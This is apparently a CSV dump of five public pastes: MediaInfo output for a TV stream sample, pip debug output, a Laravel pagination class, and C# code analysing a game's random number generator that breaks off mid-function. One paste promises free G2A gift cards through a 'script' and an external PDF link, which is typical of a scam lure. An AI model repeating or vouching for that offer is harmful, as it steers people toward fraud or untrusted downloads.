id,title,username,language,date,content
6XSq8d76,Untitled,vpeter,Bash,Wednesday 24th of April 2024 01:02:29 PM CDT,"General
ID                                       : 21 (0x15)
Complete name                            : P:\public\complete\AVS_HD_sample.ts
Format                                   : MPEG-TS
File size                                : 39.4 MiB
Duration                                 : 27 s 489 ms
Overall bit rate mode                    : Variable
Overall bit rate                         : 12.0 Mb/s

Audio
ID                                       : 670 (0x29E)
Menu ID                                  : 1 (0x1)
Format                                   : AC-3
Format/Info                              : Audio Coding 3
Commercial name                          : Dolby Digital
Codec ID                                 : 6
Duration                                 : 27 s 488 ms
Bit rate mode                            : Constant
Bit rate                                 : 448 kb/s
Channel(s)                               : 6 channels
Channel layout                           : L R C LFE Ls Rs
Sampling rate                            : 48.0 kHz
Frame rate                               : 31.250 FPS (1536 SPF)
Compression mode                         : Lossy
Stream size                              : 1.47 MiB (4%)
Service kind                             : Complete Main

Menu
ID                                       : 259 (0x103)
Menu ID                                  : 1 (0x1)
Format                                   :  / AC-3
Duration                                 : 27 s 489 ms
List                                     : 514 (0x202) () / 670 (0x29E) (AC-3)
Service name                             : CCTV15-HD
Service provider                         : CCTV
Service type                             : digital television

"
AZVs0sed,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 💰,ssss50w,GetText,Wednesday 24th of April 2024 12:57:57 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
24 April 2024"
JDvTQTb8,debug pip,Astranome,Bash,Wednesday 24th of April 2024 12:48:56 PM CDT,"root@astra-Ideapad-S110:~# pip3 debug --verbose
WARNING: This command is only meant for debugging. Do not use this with automation for parsing and getting these details, since the output and options of this command may change without notice.
pip version: pip 24.0 from /usr/local/lib/python3.7/dist-packages/pip (python 3.7)
sys.version: 3.7.5 (default, Dec  9 2021, 17:04:37)
[GCC 8.4.0]
sys.executable: /usr/bin/python3
sys.getdefaultencoding: utf-8
sys.getfilesystemencoding: utf-8
locale.getpreferredencoding: UTF-8
sys.platform: linux
sys.implementation:
  name: cpython
'cert' config value: Not specified
REQUESTS_CA_BUNDLE: None
CURL_CA_BUNDLE: None
pip._vendor.certifi.where(): /usr/local/lib/python3.7/dist-packages/pip/_vendor/certifi/cacert.pem
pip._vendor.DEBUNDLED: False
vendored library versions:
  CacheControl==0.13.1
  colorama==0.4.6
  distlib==0.3.8
  distro==1.8.0
  msgpack==1.0.5
  packaging==21.3
  platformdirs==3.8.1
  pyparsing==3.1.0
  pyproject-hooks==1.0.0
  requests==2.31.0
  certifi==2023.07.22
  chardet==5.1.0
  idna==3.4
  urllib3==1.26.17
  rich==13.4.2 (Unable to locate actual module version, using vendor.txt specified version)
  pygments==2.15.1
  typing_extensions==4.7.1 (Unable to locate actual module version, using vendor.txt specified version)
  resolvelib==1.0.1
  setuptools==68.0.0 (Unable to locate actual module version, using vendor.txt specified version)
  six==1.16.0
  tenacity==8.2.2 (Unable to locate actual module version, using vendor.txt specified version)
  tomli==2.0.1
  truststore==0.8.0 (Unable to locate actual module version, using vendor.txt specified version)
  webencodings==0.5.1 (Unable to locate actual module version, using vendor.txt specified version)
Compatible tags: 469
  cp37-cp37m-manylinux_2_27_i686
  cp37-cp37m-manylinux_2_26_i686
  cp37-cp37m-manylinux_2_25_i686
  cp37-cp37m-manylinux_2_24_i686
  cp37-cp37m-manylinux_2_23_i686
  cp37-cp37m-manylinux_2_22_i686
  cp37-cp37m-manylinux_2_21_i686
  cp37-cp37m-manylinux_2_20_i686
  cp37-cp37m-manylinux_2_19_i686
  cp37-cp37m-manylinux_2_18_i686
  cp37-cp37m-manylinux_2_17_i686
  cp37-cp37m-manylinux2014_i686
  cp37-cp37m-manylinux_2_16_i686
  cp37-cp37m-manylinux_2_15_i686
  cp37-cp37m-manylinux_2_14_i686
  cp37-cp37m-manylinux_2_13_i686
  cp37-cp37m-manylinux_2_12_i686
  cp37-cp37m-manylinux2010_i686
  cp37-cp37m-manylinux_2_11_i686
  cp37-cp37m-manylinux_2_10_i686
  cp37-cp37m-manylinux_2_9_i686
  cp37-cp37m-manylinux_2_8_i686
  cp37-cp37m-manylinux_2_7_i686
  cp37-cp37m-manylinux_2_6_i686
  cp37-cp37m-manylinux_2_5_i686
  cp37-cp37m-manylinux1_i686
  cp37-cp37m-linux_i686
  cp37-abi3-manylinux_2_27_i686
  cp37-abi3-manylinux_2_26_i686
  cp37-abi3-manylinux_2_25_i686
  cp37-abi3-manylinux_2_24_i686
  cp37-abi3-manylinux_2_23_i686
  cp37-abi3-manylinux_2_22_i686
  cp37-abi3-manylinux_2_21_i686
  cp37-abi3-manylinux_2_20_i686
  cp37-abi3-manylinux_2_19_i686
  cp37-abi3-manylinux_2_18_i686
  cp37-abi3-manylinux_2_17_i686
  cp37-abi3-manylinux2014_i686
  cp37-abi3-manylinux_2_16_i686
  cp37-abi3-manylinux_2_15_i686
  cp37-abi3-manylinux_2_14_i686
  cp37-abi3-manylinux_2_13_i686
  cp37-abi3-manylinux_2_12_i686
  cp37-abi3-manylinux2010_i686
  cp37-abi3-manylinux_2_11_i686
  cp37-abi3-manylinux_2_10_i686
  cp37-abi3-manylinux_2_9_i686
  cp37-abi3-manylinux_2_8_i686
  cp37-abi3-manylinux_2_7_i686
  cp37-abi3-manylinux_2_6_i686
  cp37-abi3-manylinux_2_5_i686
  cp37-abi3-manylinux1_i686
  cp37-abi3-linux_i686
  cp37-none-manylinux_2_27_i686
  cp37-none-manylinux_2_26_i686
  cp37-none-manylinux_2_25_i686
  cp37-none-manylinux_2_24_i686
  cp37-none-manylinux_2_23_i686
  cp37-none-manylinux_2_22_i686
  cp37-none-manylinux_2_21_i686
  cp37-none-manylinux_2_20_i686
  cp37-none-manylinux_2_19_i686
  cp37-none-manylinux_2_18_i686
  cp37-none-manylinux_2_17_i686
  cp37-none-manylinux2014_i686
  cp37-none-manylinux_2_16_i686
  cp37-none-manylinux_2_15_i686
  cp37-none-manylinux_2_14_i686
  cp37-none-manylinux_2_13_i686
  cp37-none-manylinux_2_12_i686
  cp37-none-manylinux2010_i686
  cp37-none-manylinux_2_11_i686
  cp37-none-manylinux_2_10_i686
  cp37-none-manylinux_2_9_i686
  cp37-none-manylinux_2_8_i686
  cp37-none-manylinux_2_7_i686
  cp37-none-manylinux_2_6_i686
  cp37-none-manylinux_2_5_i686
  cp37-none-manylinux1_i686
  cp37-none-linux_i686
  cp36-abi3-manylinux_2_27_i686
  cp36-abi3-manylinux_2_26_i686
  cp36-abi3-manylinux_2_25_i686
  cp36-abi3-manylinux_2_24_i686
  cp36-abi3-manylinux_2_23_i686
  cp36-abi3-manylinux_2_22_i686
  cp36-abi3-manylinux_2_21_i686
  cp36-abi3-manylinux_2_20_i686
  cp36-abi3-manylinux_2_19_i686
  cp36-abi3-manylinux_2_18_i686
  cp36-abi3-manylinux_2_17_i686
  cp36-abi3-manylinux2014_i686
  cp36-abi3-manylinux_2_16_i686
  cp36-abi3-manylinux_2_15_i686
  cp36-abi3-manylinux_2_14_i686
  cp36-abi3-manylinux_2_13_i686
  cp36-abi3-manylinux_2_12_i686
  cp36-abi3-manylinux2010_i686
  cp36-abi3-manylinux_2_11_i686
  cp36-abi3-manylinux_2_10_i686
  cp36-abi3-manylinux_2_9_i686
  cp36-abi3-manylinux_2_8_i686
  cp36-abi3-manylinux_2_7_i686
  cp36-abi3-manylinux_2_6_i686
  cp36-abi3-manylinux_2_5_i686
  cp36-abi3-manylinux1_i686
  cp36-abi3-linux_i686
  cp35-abi3-manylinux_2_27_i686
  cp35-abi3-manylinux_2_26_i686
  cp35-abi3-manylinux_2_25_i686
  cp35-abi3-manylinux_2_24_i686
  cp35-abi3-manylinux_2_23_i686
  cp35-abi3-manylinux_2_22_i686
  cp35-abi3-manylinux_2_21_i686
  cp35-abi3-manylinux_2_20_i686
  cp35-abi3-manylinux_2_19_i686
  cp35-abi3-manylinux_2_18_i686
  cp35-abi3-manylinux_2_17_i686
  cp35-abi3-manylinux2014_i686
  cp35-abi3-manylinux_2_16_i686
  cp35-abi3-manylinux_2_15_i686
  cp35-abi3-manylinux_2_14_i686
  cp35-abi3-manylinux_2_13_i686
  cp35-abi3-manylinux_2_12_i686
  cp35-abi3-manylinux2010_i686
  cp35-abi3-manylinux_2_11_i686
  cp35-abi3-manylinux_2_10_i686
  cp35-abi3-manylinux_2_9_i686
  cp35-abi3-manylinux_2_8_i686
  cp35-abi3-manylinux_2_7_i686
  cp35-abi3-manylinux_2_6_i686
  cp35-abi3-manylinux_2_5_i686
  cp35-abi3-manylinux1_i686
  cp35-abi3-linux_i686
  cp34-abi3-manylinux_2_27_i686
  cp34-abi3-manylinux_2_26_i686
  cp34-abi3-manylinux_2_25_i686
  cp34-abi3-manylinux_2_24_i686
  cp34-abi3-manylinux_2_23_i686
  cp34-abi3-manylinux_2_22_i686
  cp34-abi3-manylinux_2_21_i686
  cp34-abi3-manylinux_2_20_i686
  cp34-abi3-manylinux_2_19_i686
  cp34-abi3-manylinux_2_18_i686
  cp34-abi3-manylinux_2_17_i686
  cp34-abi3-manylinux2014_i686
  cp34-abi3-manylinux_2_16_i686
  cp34-abi3-manylinux_2_15_i686
  cp34-abi3-manylinux_2_14_i686
  cp34-abi3-manylinux_2_13_i686
  cp34-abi3-manylinux_2_12_i686
  cp34-abi3-manylinux2010_i686
  cp34-abi3-manylinux_2_11_i686
  cp34-abi3-manylinux_2_10_i686
  cp34-abi3-manylinux_2_9_i686
  cp34-abi3-manylinux_2_8_i686
  cp34-abi3-manylinux_2_7_i686
  cp34-abi3-manylinux_2_6_i686
  cp34-abi3-manylinux_2_5_i686
  cp34-abi3-manylinux1_i686
  cp34-abi3-linux_i686
  cp33-abi3-manylinux_2_27_i686
  cp33-abi3-manylinux_2_26_i686
  cp33-abi3-manylinux_2_25_i686
  cp33-abi3-manylinux_2_24_i686
  cp33-abi3-manylinux_2_23_i686
  cp33-abi3-manylinux_2_22_i686
  cp33-abi3-manylinux_2_21_i686
  cp33-abi3-manylinux_2_20_i686
  cp33-abi3-manylinux_2_19_i686
  cp33-abi3-manylinux_2_18_i686
  cp33-abi3-manylinux_2_17_i686
  cp33-abi3-manylinux2014_i686
  cp33-abi3-manylinux_2_16_i686
  cp33-abi3-manylinux_2_15_i686
  cp33-abi3-manylinux_2_14_i686
  cp33-abi3-manylinux_2_13_i686
  cp33-abi3-manylinux_2_12_i686
  cp33-abi3-manylinux2010_i686
  cp33-abi3-manylinux_2_11_i686
  cp33-abi3-manylinux_2_10_i686
  cp33-abi3-manylinux_2_9_i686
  cp33-abi3-manylinux_2_8_i686
  cp33-abi3-manylinux_2_7_i686
  cp33-abi3-manylinux_2_6_i686
  cp33-abi3-manylinux_2_5_i686
  cp33-abi3-manylinux1_i686
  cp33-abi3-linux_i686
  cp32-abi3-manylinux_2_27_i686
  cp32-abi3-manylinux_2_26_i686
  cp32-abi3-manylinux_2_25_i686
  cp32-abi3-manylinux_2_24_i686
  cp32-abi3-manylinux_2_23_i686
  cp32-abi3-manylinux_2_22_i686
  cp32-abi3-manylinux_2_21_i686
  cp32-abi3-manylinux_2_20_i686
  cp32-abi3-manylinux_2_19_i686
  cp32-abi3-manylinux_2_18_i686
  cp32-abi3-manylinux_2_17_i686
  cp32-abi3-manylinux2014_i686
  cp32-abi3-manylinux_2_16_i686
  cp32-abi3-manylinux_2_15_i686
  cp32-abi3-manylinux_2_14_i686
  cp32-abi3-manylinux_2_13_i686
  cp32-abi3-manylinux_2_12_i686
  cp32-abi3-manylinux2010_i686
  cp32-abi3-manylinux_2_11_i686
  cp32-abi3-manylinux_2_10_i686
  cp32-abi3-manylinux_2_9_i686
  cp32-abi3-manylinux_2_8_i686
  cp32-abi3-manylinux_2_7_i686
  cp32-abi3-manylinux_2_6_i686
  cp32-abi3-manylinux_2_5_i686
  cp32-abi3-manylinux1_i686
  cp32-abi3-linux_i686
  py37-none-manylinux_2_27_i686
  py37-none-manylinux_2_26_i686
  py37-none-manylinux_2_25_i686
  py37-none-manylinux_2_24_i686
  py37-none-manylinux_2_23_i686
  py37-none-manylinux_2_22_i686
  py37-none-manylinux_2_21_i686
  py37-none-manylinux_2_20_i686
  py37-none-manylinux_2_19_i686
  py37-none-manylinux_2_18_i686
  py37-none-manylinux_2_17_i686
  py37-none-manylinux2014_i686
  py37-none-manylinux_2_16_i686
  py37-none-manylinux_2_15_i686
  py37-none-manylinux_2_14_i686
  py37-none-manylinux_2_13_i686
  py37-none-manylinux_2_12_i686
  py37-none-manylinux2010_i686
  py37-none-manylinux_2_11_i686
  py37-none-manylinux_2_10_i686
  py37-none-manylinux_2_9_i686
  py37-none-manylinux_2_8_i686
  py37-none-manylinux_2_7_i686
  py37-none-manylinux_2_6_i686
  py37-none-manylinux_2_5_i686
  py37-none-manylinux1_i686
  py37-none-linux_i686
  py3-none-manylinux_2_27_i686
  py3-none-manylinux_2_26_i686
  py3-none-manylinux_2_25_i686
  py3-none-manylinux_2_24_i686
  py3-none-manylinux_2_23_i686
  py3-none-manylinux_2_22_i686
  py3-none-manylinux_2_21_i686
  py3-none-manylinux_2_20_i686
  py3-none-manylinux_2_19_i686
  py3-none-manylinux_2_18_i686
  py3-none-manylinux_2_17_i686
  py3-none-manylinux2014_i686
  py3-none-manylinux_2_16_i686
  py3-none-manylinux_2_15_i686
  py3-none-manylinux_2_14_i686
  py3-none-manylinux_2_13_i686
  py3-none-manylinux_2_12_i686
  py3-none-manylinux2010_i686
  py3-none-manylinux_2_11_i686
  py3-none-manylinux_2_10_i686
  py3-none-manylinux_2_9_i686
  py3-none-manylinux_2_8_i686
  py3-none-manylinux_2_7_i686
  py3-none-manylinux_2_6_i686
  py3-none-manylinux_2_5_i686
  py3-none-manylinux1_i686
  py3-none-linux_i686
  py36-none-manylinux_2_27_i686
  py36-none-manylinux_2_26_i686
  py36-none-manylinux_2_25_i686
  py36-none-manylinux_2_24_i686
  py36-none-manylinux_2_23_i686
  py36-none-manylinux_2_22_i686
  py36-none-manylinux_2_21_i686
  py36-none-manylinux_2_20_i686
  py36-none-manylinux_2_19_i686
  py36-none-manylinux_2_18_i686
  py36-none-manylinux_2_17_i686
  py36-none-manylinux2014_i686
  py36-none-manylinux_2_16_i686
  py36-none-manylinux_2_15_i686
  py36-none-manylinux_2_14_i686
  py36-none-manylinux_2_13_i686
  py36-none-manylinux_2_12_i686
  py36-none-manylinux2010_i686
  py36-none-manylinux_2_11_i686
  py36-none-manylinux_2_10_i686
  py36-none-manylinux_2_9_i686
  py36-none-manylinux_2_8_i686
  py36-none-manylinux_2_7_i686
  py36-none-manylinux_2_6_i686
  py36-none-manylinux_2_5_i686
  py36-none-manylinux1_i686
  py36-none-linux_i686
  py35-none-manylinux_2_27_i686
  py35-none-manylinux_2_26_i686
  py35-none-manylinux_2_25_i686
  py35-none-manylinux_2_24_i686
  py35-none-manylinux_2_23_i686
  py35-none-manylinux_2_22_i686
  py35-none-manylinux_2_21_i686
  py35-none-manylinux_2_20_i686
  py35-none-manylinux_2_19_i686
  py35-none-manylinux_2_18_i686
  py35-none-manylinux_2_17_i686
  py35-none-manylinux2014_i686
  py35-none-manylinux_2_16_i686
  py35-none-manylinux_2_15_i686
  py35-none-manylinux_2_14_i686
  py35-none-manylinux_2_13_i686
  py35-none-manylinux_2_12_i686
  py35-none-manylinux2010_i686
  py35-none-manylinux_2_11_i686
  py35-none-manylinux_2_10_i686
  py35-none-manylinux_2_9_i686
  py35-none-manylinux_2_8_i686
  py35-none-manylinux_2_7_i686
  py35-none-manylinux_2_6_i686
  py35-none-manylinux_2_5_i686
  py35-none-manylinux1_i686
  py35-none-linux_i686
  py34-none-manylinux_2_27_i686
  py34-none-manylinux_2_26_i686
  py34-none-manylinux_2_25_i686
  py34-none-manylinux_2_24_i686
  py34-none-manylinux_2_23_i686
  py34-none-manylinux_2_22_i686
  py34-none-manylinux_2_21_i686
  py34-none-manylinux_2_20_i686
  py34-none-manylinux_2_19_i686
  py34-none-manylinux_2_18_i686
  py34-none-manylinux_2_17_i686
  py34-none-manylinux2014_i686
  py34-none-manylinux_2_16_i686
  py34-none-manylinux_2_15_i686
  py34-none-manylinux_2_14_i686
  py34-none-manylinux_2_13_i686
  py34-none-manylinux_2_12_i686
  py34-none-manylinux2010_i686
  py34-none-manylinux_2_11_i686
  py34-none-manylinux_2_10_i686
  py34-none-manylinux_2_9_i686
  py34-none-manylinux_2_8_i686
  py34-none-manylinux_2_7_i686
  py34-none-manylinux_2_6_i686
  py34-none-manylinux_2_5_i686
  py34-none-manylinux1_i686
  py34-none-linux_i686
  py33-none-manylinux_2_27_i686
  py33-none-manylinux_2_26_i686
  py33-none-manylinux_2_25_i686
  py33-none-manylinux_2_24_i686
  py33-none-manylinux_2_23_i686
  py33-none-manylinux_2_22_i686
  py33-none-manylinux_2_21_i686
  py33-none-manylinux_2_20_i686
  py33-none-manylinux_2_19_i686
  py33-none-manylinux_2_18_i686
  py33-none-manylinux_2_17_i686
  py33-none-manylinux2014_i686
  py33-none-manylinux_2_16_i686
  py33-none-manylinux_2_15_i686
  py33-none-manylinux_2_14_i686
  py33-none-manylinux_2_13_i686
  py33-none-manylinux_2_12_i686
  py33-none-manylinux2010_i686
  py33-none-manylinux_2_11_i686
  py33-none-manylinux_2_10_i686
  py33-none-manylinux_2_9_i686
  py33-none-manylinux_2_8_i686
  py33-none-manylinux_2_7_i686
  py33-none-manylinux_2_6_i686
  py33-none-manylinux_2_5_i686
  py33-none-manylinux1_i686
  py33-none-linux_i686
  py32-none-manylinux_2_27_i686
  py32-none-manylinux_2_26_i686
  py32-none-manylinux_2_25_i686
  py32-none-manylinux_2_24_i686
  py32-none-manylinux_2_23_i686
  py32-none-manylinux_2_22_i686
  py32-none-manylinux_2_21_i686
  py32-none-manylinux_2_20_i686
  py32-none-manylinux_2_19_i686
  py32-none-manylinux_2_18_i686
  py32-none-manylinux_2_17_i686
  py32-none-manylinux2014_i686
  py32-none-manylinux_2_16_i686
  py32-none-manylinux_2_15_i686
  py32-none-manylinux_2_14_i686
  py32-none-manylinux_2_13_i686
  py32-none-manylinux_2_12_i686
  py32-none-manylinux2010_i686
  py32-none-manylinux_2_11_i686
  py32-none-manylinux_2_10_i686
  py32-none-manylinux_2_9_i686
  py32-none-manylinux_2_8_i686
  py32-none-manylinux_2_7_i686
  py32-none-manylinux_2_6_i686
  py32-none-manylinux_2_5_i686
  py32-none-manylinux1_i686
  py32-none-linux_i686
  py31-none-manylinux_2_27_i686
  py31-none-manylinux_2_26_i686
  py31-none-manylinux_2_25_i686
  py31-none-manylinux_2_24_i686
  py31-none-manylinux_2_23_i686
  py31-none-manylinux_2_22_i686
  py31-none-manylinux_2_21_i686
  py31-none-manylinux_2_20_i686
  py31-none-manylinux_2_19_i686
  py31-none-manylinux_2_18_i686
  py31-none-manylinux_2_17_i686
  py31-none-manylinux2014_i686
  py31-none-manylinux_2_16_i686
  py31-none-manylinux_2_15_i686
  py31-none-manylinux_2_14_i686
  py31-none-manylinux_2_13_i686
  py31-none-manylinux_2_12_i686
  py31-none-manylinux2010_i686
  py31-none-manylinux_2_11_i686
  py31-none-manylinux_2_10_i686
  py31-none-manylinux_2_9_i686
  py31-none-manylinux_2_8_i686
  py31-none-manylinux_2_7_i686
  py31-none-manylinux_2_6_i686
  py31-none-manylinux_2_5_i686
  py31-none-manylinux1_i686
  py31-none-linux_i686
  py30-none-manylinux_2_27_i686
  py30-none-manylinux_2_26_i686
  py30-none-manylinux_2_25_i686
  py30-none-manylinux_2_24_i686
  py30-none-manylinux_2_23_i686
  py30-none-manylinux_2_22_i686
  py30-none-manylinux_2_21_i686
  py30-none-manylinux_2_20_i686
  py30-none-manylinux_2_19_i686
  py30-none-manylinux_2_18_i686
  py30-none-manylinux_2_17_i686
  py30-none-manylinux2014_i686
  py30-none-manylinux_2_16_i686
  py30-none-manylinux_2_15_i686
  py30-none-manylinux_2_14_i686
  py30-none-manylinux_2_13_i686
  py30-none-manylinux_2_12_i686
  py30-none-manylinux2010_i686
  py30-none-manylinux_2_11_i686
  py30-none-manylinux_2_10_i686
  py30-none-manylinux_2_9_i686
  py30-none-manylinux_2_8_i686
  py30-none-manylinux_2_7_i686
  py30-none-manylinux_2_6_i686
  py30-none-manylinux_2_5_i686
  py30-none-manylinux1_i686
  py30-none-linux_i686
  cp37-none-any
  py37-none-any
  py3-none-any
  py36-none-any
  py35-none-any
  py34-none-any
  py33-none-any
  py32-none-any
  py31-none-any
  py30-none-any
root@astra-Ideapad-S110:~#
"
kbRXYrg4,Untitled,MatvikX,PHP,Wednesday 24th of April 2024 12:43:08 PM CDT,"<?php

namespace App\Components;

use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Arr;

class SeoPaginator extends LengthAwarePaginator
{
    /**
     * Remove page parameter from the first page URL.
     * Removing URL from active page.
     *
     * @param [type] $page
     * @return void
     */
    public function url($page)
    {
        if ($page <= 0) {
            $page = 1;
        }

        if ($this->currentPage == $page) {
            return null;
        }

        // If we have any extra query string key / value pairs that need to be added
        // onto the URL, we will put them in query string form and then attach it
        // to the URL. This allows for extra information like sortings storage.
        $parameters = [$this->pageName => $page];

        if (count($this->query) > 0) {
            $parameters = array_merge($this->query, $parameters);
        }

        // Remove 'page' parameter if it's 1
        if ($page == 1 && isset($parameters['page'])) {
            unset($parameters['page']);
        } else {
            $parameters['page'] = $page;
        }

        $result =  $this->path()
            . (count($parameters) > 0
                ? (str_contains($this->path(), '?') ? '&' : '?')
                : '')
            . Arr::query($parameters)
            . $this->buildFragment();

        return trim($result, '?&');
    }
}

// In AppServiceProvider
$this->app->alias(SeoPaginator::class, LengthAwarePaginator::class);"
KwmDrRwS,dumb program,DreMinus,C#,Wednesday 24th of April 2024 12:37:25 PM CDT,"using System.Text;

var initialSeed = 0xDEAD0CAB;
var seed = 0xDEAD0CAB;
var initialState = seed;

var initialAmount = 0;
long endAmount = 32768;
var intervalAmount = 15;

var doIntervals = false;
var amountToIncreaseBy = 1;
var thresholdOfAnalysis = 8;

if (doIntervals)
{
  for (var i = initialAmount; i <= endAmount; i += amountToIncreaseBy)
  {
    var amountForInterval = AnalyzeRngForInitialAmountOfCalls(i, intervalAmount);
    if (amountForInterval >= thresholdOfAnalysis)
    {
      //Console.WriteLine($""{i}-{i + intervalAmount}-{amountForInterval}"");
    }
  }
}
else
{
  var amountForInterval = AnalyzeRngForInitialAmountOfCalls(initialAmount, endAmount);
}

int AnalyzeRngForInitialAmountOfCalls(int beforeEntryAmount, long intervalAmount)
{
  var build = new StringBuilder();
  long maxNumberOfCalls = beforeEntryAmount+intervalAmount;

  var fileTimer = 0;
  var amountOfTimesInFullRngCycle = 0;

  seed = initialSeed;
  if (beforeEntryAmount != 0)
  {
    for (long preRngCalls = 0; preRngCalls <= beforeEntryAmount; preRngCalls++)
    {
      rand();
    }
  }

  //long countOfBuildingAtEnd = 0;
  //long countOfBuildingAtBegin = 0;
  //long countOfRightSideAlley = 0;
  //long countOfLeftSideAlley = 0;
  //long countOfUnderAwning = 0;
  //long countOfMiddleOfBuilding = 0;

  //long count30 = 0;
  //long count31 = 0;
  //long count32 = 0, count33 = 0, count34 = 0, count35 = 0, count36 = 0, count37 = 0, count38 = 0, count39 = 0, count3A = 0, count3B = 0;

  //long count40 = 0, count41 = 0, count42 = 0;

  for (long i = beforeEntryAmount; i <= maxNumberOfCalls; i++)
  {
    initialState = seed;

    //if (initialState == 0xDEAD0CAB)
    //{
    //  Console.WriteLine($""I did a full cycle at {i} calls"");
    //}

    var timesToOffset = calculateOffset(fileTimer);
    offsetRng(timesToOffset);
    var piece1 = getPiece1(Stages.SpeedHighway);
    var piece2 = getPiece2(Stages.SpeedHighway);
    var piece3 = getPiece3(Stages.SpeedHighway);
    //if (piece1 == 0x12 && piece2 == 0x3A && piece3 == 0x41)
    //{
    //amountOfTimesInFullRngCycle++;
    //}

    var goodSets = new List<ValueTuple<int, int, int>>
    {
      new (0x11, 0x3A, 0x41),
      new (0x12, 0x30, 0x41),
      new (0x12, 0x31, 0x41),
      new (0x12, 0x32, 0x41),
      new (0x12, 0x35, 0x41),
      new (0x12, 0x37, 0x41),
      new (0x12, 0x3A, 0x41),
      new (0x12, 0x3B, 0x41),
      new (0x13, 0x30, 0x41),
      new (0x13, 0x31, 0x41),
      new (0x13, 0x32, 0x41),
      new (0x13, 0x35, 0x41),
      new (0x13, 0x37, 0x41),
      new (0x13, 0x3A, 0x41),
      new (0x13, 0x3B, 0x41),
      new (0x15, 0x3B, 0x41),
      new (0x15, 0x3B, 0x41),
      new (0x12, 0x31, 0x40),
      new (0x12, 0x3B, 0x40)
    };
    var theSet = new ValueTuple<int, int, int>(piece1, piece2, piece3);
    if (goodSets.Contains(theSet))
    {
      //Console.WriteLine($""{i}-{theSet.Item1:X}-{theSet.Item2:X}-{theSet.Item3:X}"");
      amountOfTimesInFullRngCycle++;
    }

    build.Append($""{i},{initialState:X},{theSet.Item1:X},{theSet.Item2:X},{theSet.Item3:X}{Environment.NewLine}"");
    //Console.WriteLine($""{i},{theSet.Item1:X},{theSet.Item2:X},{theSet.Item3:X}"");
    //var shGoodPiece1s = new List<int> { 0x12, 0x13, 0x15 };
    //var shGoodPiece2s = new List<int> { 0x30, 0x31, 0x32, 0x37, 0x3A, 0x3B };
    //var shGoodPiece3s = new List<int> { 0x40, 0x41 };

    //if (shGoodPiece1s.Contains(piece1) && shGoodPiece2s.Contains(piece2) && shGoodPiece3s.Contains(piece3))
    //{
    //  Console.WriteLine($""{i}-{piece1:X}-{piece2:X}-{piece3:X}"");
    //  amountOfTimesInFullRngCycle++;
    //}

    //switch ((SpeedHighwayP1s)piece1)
    //{
    //  case SpeedHighwayP1s.BuildingAtEnd:
    //    countOfBuildingAtEnd++;
    //    break;
    //  case SpeedHighwayP1s.BuildingAtBegin:
    //    countOfBuildingAtBegin++;
    //    break;
    //  case SpeedHighwayP1s.RightSideAlley:
    //    countOfRightSideAlley++;
    //    break;
    //  case SpeedHighwayP1s.LeftSideAlley:
    //    countOfLeftSideAlley++;
    //    break;
    //  case SpeedHighwayP1s.UnderAwning:
    //    countOfUnderAwning++;
    //    break;
    //  case SpeedHighwayP1s.MiddleOfBuilding:
    //    countOfMiddleOfBuilding++;
    //    break;
    //}

    //switch ((SpeedHighwayP2s)piece2)
    //{
    //  case SpeedHighwayP2s.YellowCanisterNearGreyBalcony:
    //    count30++;
    //    break;
    //  case SpeedHighwayP2s.GreyCanisterNearMiddleEntrance:
    //    count31++;
    //    break;
    //  case SpeedHighwayP2s.YellowCanisterNearMiddleBuilding:
    //    count32++;
    //    break;
    //  case SpeedHighwayP2s.GreyCanisterNearEnd:
    //    count33++;
    //    break;
    //  case SpeedHighwayP2s.YellowCanisterNearElectricEnemy:
    //    count34++;
    //    break;
    //  case SpeedHighwayP2s.GreyCanisterInAlcove:
    //    count35++;
    //    break;
    //  case SpeedHighwayP2s.ElectricSpinner:
    //    count36++;
    //    break;
    //  case SpeedHighwayP2s.BlackSpikeNearGreyBalcony:
    //    count37++;
    //    break;
    //  case SpeedHighwayP2s.BlackSpikeNearBuildingP1:
    //    count38++;
    //    break;
    //  case SpeedHighwayP2s.Cop:
    //    count39++;
    //    break;
    //  case SpeedHighwayP2s.BlackSpikeMiddleBuilding:
    //    count3A++;
    //    break;
    //  case SpeedHighwayP2s.BlackSpikeIL:
    //    count3B++;
    //    break;
    //}

    //switch ((SpeedHighwayP3s)piece3)
    //{
    //  case SpeedHighwayP3s.GreyBalcony:
    //    count40++;
    //    break;
    //  case SpeedHighwayP3s.BalconyNearSpawn:
    //    count41++;
    //    break;
    //  case SpeedHighwayP3s.RedBalcony:
    //    count42++;
    //    break;
    //}

    seed = initialState;
    rand();
  }

  //Console.WriteLine($""Count of YellowCanisterNearGreyBalcony: {count30}"");
  //Console.WriteLine($""Count of GreyCanisterNearMiddleEntrance: {count31}"");
  //Console.WriteLine($""Count of YellowCanisterNearMiddleBuilding: {count32}"");
  //Console.WriteLine($""Count of GreyCanisterNearEnd: {count33}"");
  //Console.WriteLine($""Count of YellowCanisterNearElectricEnemy: {count34}"");
  //Console.WriteLine($""Count of GreyCanisterInAlcove: {count35}"");
  //Console.WriteLine($""Count of ElectricSpinner: {count36}"");
  //Console.WriteLine($""Count of BlackSpikeNearGreyBalcony: {count37}"");
  //Console.WriteLine($""Count of BlackSpikeNearBuildingP1: {count38}"");
  //Console.WriteLine($""Count of Cop: {count39}"");
  //Console.WriteLine($""Count of BlackSpikeMiddleBuilding: {count3A}"");
  //Console.WriteLine($""Count of BlackSpikeIL: {count3B}"");

  var thing = build.ToString();

  return amountOfTimesInFullRngCycle;

  //Console.WriteLine($""Piece 1 = {piece1:X}"");
  //Console.WriteLine($""Piece 2 = {piece2:X}"");
  //Console.WriteLine($""Piece 3 = {piece3:X}"");
}


int calculateOffset(int fileFrameCount) => fileFrameCount & 0xF;

void offsetRng(int offset)
{
  for (int i = 0; i < offset; i++)
  {
    rand();
  }
}

uint rand()
{
  seed = 0x343FD * seed + 0x269EC3;
  return (seed >> 0x10) & 0x7FFF;
}

void srand(uint newSeed)
{
  seed = newSeed;
}

int getPiece1(Stages stage)
{
  int possiblePiece1s = 0;
  switch (stage)
  {
    case Stages.SpeedHighway:
      possiblePiece1s = 0x6;
      break;
    case Stages.Casinopolis:
      possiblePiece1s = 0x6;
      break;
    case Stages.RedMountain:
      possiblePiece1s = 0x6;
      break;
    case Stages.SkyDeck:
      possiblePiece1s = 0x3;
      break;
  }
